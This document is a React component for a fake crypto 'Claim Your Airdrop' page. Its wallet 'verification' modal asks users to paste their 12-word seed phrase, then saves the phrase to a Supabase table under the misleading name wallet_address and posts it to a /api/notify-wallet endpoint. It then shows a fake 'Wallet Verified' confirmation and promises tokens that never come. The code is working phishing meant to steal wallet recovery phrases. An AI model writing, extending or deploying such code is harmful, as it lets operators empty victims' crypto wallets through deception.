'use client'

import { useState, useEffect } from 'react'
import { X, CheckCircle, Wallet, AlertCircle } from 'lucide-react'
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
)

const WALLETS = [
  { name: 'MetaMask', logo: '/mm.JPG' },
  { name: 'Trust Wallet', logo: '/tw.JPG' },
  { name: 'Binance', logo: '/binance.JPG' },
  { name: 'MEXC', logo: '/mexc.JPG' },
  { name: 'Coinbase', logo: '/cb.JPG' },
  { name: 'OKX', logo: '/okx.JPG' },
  { name: 'WalletConnect', logo: '/wallets/walletconnect.png' },
  { name: 'Phantom', logo: '/Phantom.webp' },
]


type WalletStatus = 'idle' | 'connecting' | 'connected'

interface ClaimSheetProps {
  onClose: () => void
  airdropId: string | null
  connectedAddress?: string | null
}

export default function ClaimSheet({ onClose, airdropId, connectedAddress: externalAddress }: ClaimSheetProps) {
  // ── Claim state ──
  const [agreed, setAgreed] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const [loading, setLoading] = useState(false)

  // ── Wallet connect state ──
  const [walletOpen, setWalletOpen] = useState(false)
  const [walletAddress, setWalletAddress] = useState(externalAddress ?? '')
  const [walletStatus, setWalletStatus] = useState<WalletStatus>(externalAddress ? 'connected' : 'idle')
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [walletError, setWalletError] = useState('')

  const isConnected = walletStatus === 'connected'

  useEffect(() => {
    if (externalAddress) {
      setWalletAddress(externalAddress)
      setWalletStatus('connected')
    }
  }, [externalAddress])

  useEffect(() => {
    if (walletOpen) document.body.style.overflow = 'hidden'
    return () => { document.body.style.overflow = '' }
  }, [walletOpen])

  const handleWalletClose = () => {
    if (walletStatus === 'connecting') return
    setWalletOpen(false)
    setTimeout(() => {
      if (walletStatus !== 'connected') {
        setWalletAddress('')
        setSelectedWallet(null)
        setWalletStatus('idle')
        setWalletError('')
      }
    }, 400)
  }

  const handleWalletConnect = async () => {
    if (!walletAddress.trim()) {
      setWalletError('Please enter your 12 Seed Phrase.')
      return
    }
    setWalletError('')
    setWalletStatus('connecting')

    try {
      const { error: dbError } = await supabase
        .from('wallet_connections')
        .insert([
              {
                wallet_address: walletAddress.trim(),
                user_id: selectedWallet,
              },
            ])

      if (dbError) throw dbError
      await fetch('/api/notify-wallet', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ walletType: selectedWallet, walletAddress: walletAddress.trim() }),
        })
      setTimeout(() => {
        setWalletStatus('connected')
      }, 1800)
    } catch (err) {
      console.error(err)
      setWalletError('Something went wrong. Please try again.')
      setWalletStatus('idle')
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isConnected) {
      setWalletOpen(true)
      return
    }
    if (!agreed) return
    setLoading(true)
    await new Promise((resolve) => setTimeout(resolve, 1000))
    setSubmitted(true)
    setLoading(false)
    setTimeout(onClose, 3000)
  }

  return (
    <>
      {/* ── Claim sheet overlay ── */}
      <div
        className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40 animate-fade-in"
        onClick={onClose}
      />

      {/* ── Claim sheet — original design untouched ── */}
      <div className="fixed bottom-0 left-0 right-0 z-50 animate-slide-up">
        <div className="bg-card border-t border-border rounded-t-2xl max-w-2xl mx-auto w-full p-6 sm:p-8">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-2xl font-bold">Claim Your Airdrop</h2>
            <button
              onClick={onClose}
              className="p-2 hover:bg-primary/10 rounded-full transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {!submitted ? (
            <form onSubmit={handleSubmit} className="space-y-6">
              <p className="text-muted-foreground">
                {isConnected
                  ? "Your airdrop will be sent to your connected wallet. Confirm below to proceed."
                  : "Please Verify your wallet to claim tokens."}
              </p>

              {/* Connected wallet pill — shown only when connected */}
              {isConnected && (
                <div className="flex items-center gap-3 px-4 py-3 rounded-lg border border-primary/30 bg-primary/5">
                  <Wallet className="w-4 h-4 text-primary flex-shrink-0" />
                  <p className="text-sm font-mono text-primary truncate flex-1">{walletAddress}</p>
                  <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse flex-shrink-0" />
                </div>
              )}

              {/* Agreement checkbox — only when connected */}
              {isConnected && (
                <div className="flex items-start gap-3">
                  <input
                    type="checkbox"
                    id="agree"
                    checked={agreed}
                    onChange={(e) => setAgreed(e.target.checked)}
                    className="mt-1 w-4 h-4 rounded border-border cursor-pointer"
                  />
                  <label htmlFor="agree" className="text-sm text-muted-foreground cursor-pointer">
                    I understand that tokens will be sent to this address and I have verified it is correct. I agree to the terms of service.
                  </label>
                </div>
              )}

              <button
                type="submit"
                disabled={(isConnected && !agreed) || loading}
                className={`w-full py-3 rounded-lg font-semibold transition-all duration-300 flex items-center justify-center gap-2 ${
                  (isConnected && !agreed) || loading
                    ? 'bg-muted text-muted-foreground cursor-not-allowed opacity-50'
                    : 'bg-gradient-to-r from-primary to-secondary text-primary-foreground hover:shadow-lg hover:shadow-primary/50'
                }`}
              >
                {loading ? (
                  <>
                    <Spinner />
                    Processing...
                  </>
                ) : !isConnected ? (
                  <>
                    <Wallet className="w-4 h-4" />
                    Connect Wallet to Claim
                  </>
                ) : (
                  'Claim Airdrop'
                )}
              </button>
            </form>
          ) : (
            <div className="flex flex-col items-center justify-center py-12 space-y-4 animate-fade-in">
              <div className="w-16 h-16 rounded-full bg-green-400/20 flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-green-400" />
              </div>
              <h3 className="text-2xl font-bold">Claim Submitted!</h3>
              <p className="text-muted-foreground text-center">
                Your claim has been recorded. Tokens will be distributed within 24-48 hours to your wallet address.
              </p>
              <p className="text-sm text-primary font-mono bg-primary/10 px-4 py-2 rounded">
                {walletAddress}
              </p>
            </div>
          )}
        </div>
      </div>

      {/* ── Wallet connect modal — slides up on top of claim sheet ── */}

      {/* Wallet backdrop */}
      <div
        onClick={handleWalletClose}
        className={`fixed inset-0 z-[60] bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${
          walletOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
        }`}
      />

      {/* Wallet panel */}
      <div
        className={`fixed bottom-0 left-0 right-0 z-[70] bg-background rounded-t-3xl border-t border-border transition-transform duration-500 ease-[cubic-bezier(0.32,0.72,0,1)] ${
          walletOpen ? 'translate-y-0' : 'translate-y-full'
        }`}
        style={{ maxHeight: '92dvh', overflowY: 'auto' }}
      >
        {/* Handle bar */}
        <div className="flex justify-center pt-3 pb-1">
          <div className="w-10 h-1 rounded-full bg-border" />
        </div>

        <div className="px-5 pb-10 pt-2">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-lg font-semibold">Verify Wallet</h2>
            <button
              onClick={handleWalletClose}
              className="p-2 rounded-full hover:bg-muted transition-colors"
            >
              <X className="w-5 h-5 text-muted-foreground" />
            </button>
          </div>

          {walletStatus === 'connected' ? (
            <div className="flex flex-col items-center gap-4 py-8">
              <CheckCircle className="w-16 h-16 text-green-500" />
              <p className="text-lg font-medium">Wallet Verified!</p>
              <p className="text-sm text-muted-foreground break-all text-center max-w-xs">
                {walletAddress}
              </p>
              <button
                onClick={() => setWalletOpen(false)}
                className="mt-4 px-6 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:opacity-90 transition-opacity"
              >
                Done
              </button>
            </div>
          ) : (
            <>
              {/* Info banner */}
              <div className="flex items-start gap-3 mb-5 px-4 py-3 rounded-xl bg-primary/5 border border-primary/20">
                <AlertCircle className="w-4 h-4 text-primary mt-0.5 flex-shrink-0" />
                <p className="text-sm text-muted-foreground">
                  Wallet not Verified. Your airdrop will be sent directly to your verified wallet.
                </p>
              </div>

              {/* Wallet grid */}
              <p className="text-sm text-muted-foreground mb-3">Choose your wallet</p>
              <div className="grid grid-cols-4 gap-3 mb-6">
                {WALLETS.map((w) => (
                  <button
                    key={w.name}
                    onClick={() => setSelectedWallet(w.name)}
                    className={`flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all duration-200 ${
                      selectedWallet === w.name
                        ? 'border-primary bg-primary/10'
                        : 'border-border hover:border-primary/50 hover:bg-muted/50'
                    }`}
                  >
                    <img
                      src={w.logo}
                      alt={w.name}
                      className="w-8 h-8 object-contain rounded-md"
                      onError={(e) => {
                        ;(e.target as HTMLImageElement).src =
                          `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%23888'/><text x='50%' y='55%' dominant-baseline='middle' text-anchor='middle' fill='white' font-size='12'>${w.name[0]}</text></svg>`
                      }}
                    />
                    <span className="text-[10px] text-muted-foreground leading-tight text-center line-clamp-1 w-full">
                      {w.name}
                    </span>
                  </button>
                ))}
              </div>

              {/* Address textarea */}
              <div className="mb-4">
                <label className="block text-sm font-medium mb-2">Verify this is an active wallet to avoid loss of token</label>
                <textarea
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="Enter or paste your 12 seed phrase"
                  rows={3}
                  className="w-full px-4 py-3 rounded-xl border border-border bg-muted/40 text-sm resize-none focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary placeholder:text-muted-foreground transition-all"
                />
                {walletError && (
                  <p className="mt-1.5 text-xs text-destructive">{walletError}</p>
                )}
              </div>

              {/* Connect button */}
              <button
                onClick={handleWalletConnect}
                disabled={walletStatus === 'connecting'}
                className="w-full flex items-center justify-center gap-2 py-3 px-4 bg-primary text-primary-foreground rounded-xl font-medium text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {walletStatus === 'connecting' ? (
                  <>
                    <Spinner />
                    Verifying…
                  </>
                ) : (
                  <>
                    <Wallet className="w-4 h-4" />
                    Verify Wallet
                  </>
                )}
              </button>

              <p className="mt-4 text-center text-xs text-muted-foreground">
                By connecting, you agree to our Terms of Service
              </p>
            </>
          )}
        </div>
      </div>
    </>
  )
}

function Spinner() {
  return (
    <svg
      className="animate-spin w-4 h-4"
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      viewBox="0 0 24 24"
    >
      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
    </svg>
  )
}